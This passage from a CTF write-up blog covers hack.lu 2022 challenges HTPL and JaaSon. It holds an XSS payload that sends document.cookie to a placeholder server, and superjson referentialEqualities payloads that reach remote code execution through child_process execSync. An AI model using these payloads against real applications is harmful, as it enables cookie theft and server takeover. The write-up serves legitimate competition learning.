<span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> $c$<span class="token operator">=</span><span class="token punctuation">(</span>$b$<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"alert(\"xss\")"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>$c$<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>terjanq’s <a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/1926a1afb420bd98ac7b97031e377436">solution</a> is shorter, directly using iframe + name to get the feature of window in the iframe, and then get the eval in the iframe (it doesn’t matter if you remove that if):</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>$win$</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-program</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-if</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-num</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-num</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-const</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
        
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-lt</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>win<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
                
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-not</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-dec</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>asd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-dec</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-not</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-lt</span><span class="token punctuation">></span></span>        
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-const</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-array</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>eval<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-array</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-call</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-identifier</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-identifier</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x-str</span><span class="token punctuation">></span></span>top.location='https://server/?c='+document.cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-str</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-call</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-if</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x-program</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The code will be:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">write</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">alert</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token function-variable function">read</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">prompt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">const</span> $test$<span class="token operator">=</span>$win$<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>$asd$<span class="token punctuation">;</span>
<span class="token punctuation">[</span><span class="token string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span>$test$<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"alert(1337)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2><span id="jaason6-solves">JaaSon(6 solves)</span></h2><p>As a bonus, this is a misc JS problem. You can give a json string, which will be thrown into <a target="_blank" rel="noopener" href="https://github.com/blitz-js/superjson">superjson</a>.</p>
<p>Although the version used has a prototype pollution vulnerability, it has already locked the prototype with <code>Object.freeze(Object.prototype)</code>, so there is no prototype pollution that can be used.</p>
<p>I haven’t had time to study this problem yet, but it is related to the internal operation mechanism of superjson. You can use <code>referentialEqualities</code> to specify some values, for example:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
  <span class="token string-property property">"json"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"brands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token punctuation">&#123;</span> <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"Sonar"</span> <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span><span class="token punctuation">,</span>
    <span class="token string-property property">"products"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
      <span class="token punctuation">&#123;</span> <span class="token string-property property">"name"</span><span class="token operator">:</span> <span class="token string">"SonarQube"</span><span class="token punctuation">,</span>  <span class="token string-property property">"brand"</span><span class="token operator">:</span> <span class="token keyword">null</span> <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
  <span class="token string-property property">"meta"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
    <span class="token string-property property">"referentialEqualities"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
      <span class="token string-property property">"brands.0"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"products.0.brand"</span><span class="token punctuation">]</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>It will execute <code>products[0].brand = brands[0];</code>, which seems to be intended to solve the reference problem when deep cloning.</p>
<p>For more details, please refer to: <a target="_blank" rel="noopener" href="https://blog.sonarsource.com/blitzjs-prototype-pollution/">Remote Code Execution via Prototype Pollution in Blitz.js</a>, which explains it more comprehensively.</p>
<p>I haven’t studied the other details, but it seems that some things in the object are replaced through this feature.</p>
<p>Below is the payload posted by szymex73 in DC:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
   <span class="token string-property property">"json"</span><span class="token operator">:</span><span class="token punctuation">[</span>
      <span class="token punctuation">[</span>
         <span class="token keyword">null</span><span class="token punctuation">,</span>
         <span class="token punctuation">[</span>
            <span class="token punctuation">&#123;</span>
               <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token string">"console.log(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"</span>
            <span class="token punctuation">&#125;</span>
         <span class="token punctuation">]</span>
      <span class="token punctuation">]</span>
   <span class="token punctuation">]</span><span class="token punctuation">,</span>
   <span class="token string-property property">"meta"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
      <span class="token string-property property">"values"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
         <span class="token string-property property">"2"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"map"</span>
         <span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
      <span class="token string-property property">"referentialEqualities"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
         <span class="token string-property property">"constructor.prototype"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"find.constructor"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.get"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"push"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.set"</span><span class="token punctuation">,</span>
            <span class="token string">"1.delete"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"pop"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.next"</span><span class="token punctuation">,</span>
            <span class="token string">"0.keys"</span><span class="token punctuation">,</span>
            <span class="token string">"1.charAt"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"2.constructor.prototype"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.__proto__"</span><span class="token punctuation">,</span>
            <span class="token string">"0.0"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">"0.2"</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token string">"1.toString"</span>
         <span class="token punctuation">]</span><span class="token punctuation">,</span>
         <span class="token string-property property">""</span><span class="token operator">:</span><span class="token punctuation">[</span>
            <span class="token punctuation">[</span>
               <span class="token punctuation">[</span>
                  <span class="token number">1</span>
               <span class="token punctuation">]</span>
            <span class="token punctuation">]</span>
         <span class="token punctuation">]</span>
      <span class="token punctuation">&#125;</span>
   <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Compared to the above, my teammate pew’s payload seems to be easier to understand:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> superjson <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'superjson'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>default<span class="token punctuation">;</span>

Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span>

javascript <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">console.log(process.mainModule.require('child_process').execSync("/readflag").toString())</span><span class="token template-punctuation string">`</span></span>

<span class="token keyword">var</span> json <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>
    <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">json</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">real_error</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string-property property">"message"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
            <span class="token literal-property property">real_map</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token literal-property property">fake_map</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token literal-property property">real_str</span><span class="token operator">:</span> <span class="token string">"xxd"</span><span class="token punctuation">,</span>
            <span class="token literal-property property">real_arr</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token literal-property property">x</span><span class="token operator">:</span> javascript<span class="token punctuation">,</span>
            <span class="token literal-property property">js</span><span class="token operator">:</span> javascript<span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token literal-property property">meta</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
          <span class="token literal-property property">referentialEqualities</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string-property property">'real_error.toString'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.toString'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'constructor.constructor'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.get'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'real_str.replace'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.set'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'js'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'real_arr.constructor.prototype.values'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.keys'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'real_map.__proto__'</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.__proto__'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
            <span class="token string-property property">'x'</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'fake_map.0'</span><span class="token punctuation">]</span>
          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
          <span class="token literal-property property">values</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
              <span class="token literal-property property">real_map</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                  <span class="token string">"map"</span>
              <span class="token punctuation">]</span><span class="token punctuation">,</span>
              <span class="token literal-property property">real_error</span><span class="token operator">:</span> <span class="token punctuation">[</span>
                  <span class="token string">"Error"</span>
              <span class="token punctuation">]</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2><span id="postscript">Postscript</span></h2><p>The problems this time are all very interesting and novel. For example, the Python problem only uses decorators to execute arbitrary code, which is very cool, or the foodAPI directly tests a denoDB 0-day, which is also quite powerful.</p>
<p>The mysterious syntax of SQLite is also eye-opening. I look forward to someone posting a write-up in the future to explain which part of the code has that feature, and whether it is a feature or a bug.</p>
<p>The final point of HTPL is actually the JS comment <code>&lt;!--</code>, but after being wrapped up, it is not so easy to find. This kind of “discovering familiar things after unpacking” is ideal for the problem.</p>
<p>For example, like the gif problem, if I didn’t solve it, I would only think that my knowledge is insufficient and I don’t know that <code>..gif</code> can be bypassed, or I would think that my ability to read code is insufficient and I can’t see too deeply. But for the HTPL problem, if I didn’t solve it but found that the knowledge point was something I knew, I would feel that the problem was packaged very cleverly.</p>
<p>Suddenly I feel that it is similar to some of the problems in the past competitions. Some problems cannot be solved because I really haven’t learned that algorithm, but some problems are not too difficult after being broken down layer by layer, but they are packaged very well, so I will feel “Wow, this problem setter is so powerful.”</p>
<p>By the way, terjanq is the GOAT in the CTF world for frontend, browser, and JS-related problems in my mind. I feel that as long as it is this type of problem, he can definitely solve it, which is really amazing.</p>
<p>Of course, other strong players are not weak. Every time I find that the difficult problems are almost solved by those few people. XD</p>

    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2022/12/08/en/ctf-js-notes/">Notes on Several CTF Challenges Related to Web and JS</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2022/10/08/en/sekaictf2022-safelist-and-connection/">SekaiCTF 2022 Notes and Concurrent Limit</a>
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">Comments</h3>
    <script src="https://utteranc.es/client.js"
        repo="aszx87410/huli-blog"
        issue-term="title"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2023 Huli&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
<div class="column is-narrow has-text-centered">
    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
        <div class="dropdown-trigger">
            <button class="button is-small" aria-haspopup="true">
                <span class="icon">
                    <i class="fas fa-globe"></i>
                </span>
                <span>English</span>
                <span class="icon is-small">
            <i class="fas fa-angle-down" aria-hidden="true"></i>
          </span>
            </button>
        </div>
        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
            <div class="dropdown-content">
            <!-- NOTE: 永遠回到首頁 -->
            
                <a href="/2022/10/31/hacklu-ctf-2022-writeup/" class="dropdown-item">
                    繁體中文
                </a>
            
            </div>
        </div>
    </div>
</div>

        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>



    
    
    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js?v=3.js"></script>


    
</body>
</html>